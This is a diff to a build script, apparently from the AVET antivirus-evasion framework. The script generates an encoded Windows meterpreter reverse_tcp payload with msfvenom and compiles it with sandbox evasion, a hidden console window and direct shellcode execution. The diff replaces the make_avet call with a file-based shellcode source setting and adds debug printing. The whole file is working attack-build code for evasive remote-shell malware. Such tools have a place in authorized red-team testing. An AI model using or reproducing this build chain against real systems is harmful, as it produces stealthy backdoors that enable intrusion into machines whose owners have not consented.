@@ -13,12 +13,8 @@
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
-# generate payload and call avet
+# generate payload
 msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-
-# keep make_avet to at least get the shellcode input
-# request debug outputs via -p flag
-./make_avet -f sc.txt -p
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -29,8 +25,14 @@ add_feature fopen_sandbox_evasion
 # hide console window
 add_feature hide_console
 
+# set shellcode source
+shellcode_source from_file
+
 # set shellcode binding technique
 shellcode_binding exec_shellcode
+
+# enable debug printing
+append_value PRINT_DEBUG "" get_shellcode.h	
 
 # add gethostbyname killswitch evasion feature
 #append_value KVALUE localhost
